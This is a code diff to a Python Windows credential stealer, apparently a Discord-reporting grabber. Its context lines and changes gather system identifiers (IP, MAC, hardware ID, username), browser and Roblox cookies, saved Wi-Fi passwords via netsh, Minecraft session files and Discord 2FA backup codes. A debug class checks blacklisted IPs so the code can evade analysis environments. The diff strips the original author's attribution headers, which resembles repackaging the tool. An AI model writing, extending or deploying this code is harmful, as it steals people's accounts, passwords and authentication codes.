@@ -203,6 +203,12 @@ class PcInfo:
         cpu = wmi.WMI().Win32_Processor()[0]
         gpu = wmi.WMI().Win32_VideoController()[0]
         ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
+        username = os.getenv("UserName")
+        hostname = os.getenv("COMPUTERNAME")
+        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
+                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
+        ip = requests.get('https://api.ipify.org').text
+        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
 
         embed.add_field(
             name="System Info",
@@ -631,7 +637,6 @@ class Browsers:
         else:
             robo_cookie = ""
             with open(os.path.join(tempfolder, "Roblox", "Roblox Cookies.txt"), 'w', encoding="utf-8") as f:
-                f.write(f"{github} | Roblox Cookies\n\n")
                 with open(os.path.join(tempfolder, "Browser", "Browser Cookies.txt"), 'r', encoding="utf-8") as f2:
                     try:
                         for line in f2:
@@ -651,9 +656,6 @@ class Wifi:
         self.name_pass = {}
 
         os.makedirs(os.path.join(tempfolder, "Wifi"), exist_ok=True)
-
-        with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
-            f.write(f"{github} | Wifi Networks & Passwords\n\n")
 
         data = subprocess.getoutput('netsh wlan show profiles').split('\n')
         for line in data:
@@ -696,7 +698,6 @@ class Minecraft:
 
     def session_info(self):
         with open(os.path.join(tempfolder, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
-            f.write(f"{github} | Minecraft Session Info\n\n")
             if os.path.exists(self.roaming + self.accounts_path):
                 with open(self.roaming + self.accounts_path, "r") as g:
                     self.session = json.load(g)
@@ -707,7 +708,6 @@ class Minecraft:
 
     def user_cache(self):
         with open(os.path.join(tempfolder, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
-            f.write(f"{github} | Minecraft User Cache\n\n")
             if os.path.exists(self.roaming + self.usercache_path):
                 with open(self.roaming + self.usercache_path, "r") as g:
                     self.user = json.load(g)
@@ -728,7 +728,6 @@ class BackupCodes:
 
     def get_codes(self):
         with open(os.path.join(tempfolder, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
-            f.write(f"{github} | Discord Backup Codes\n\n")
             if os.path.exists(self.path + self.code_path):
                 with open(self.path + self.code_path, 'r') as g:
                     for line in g.readlines():
@@ -909,11 +908,8 @@ class Debug:
             sys.exit(0)
 
     def get_network(self) -> bool:
-        global ip, mac, github
-
         ip = requests.get('https://api.ipify.org').text
         mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-        github = "https://github.com/Smug246"
 
         if ip in self.blackListedIPS:
             return True
@@ -921,8 +917,6 @@ class Debug:
             return True
 
     def get_system(self) -> bool:
-        global hwid, username, hostname
-
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
         hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
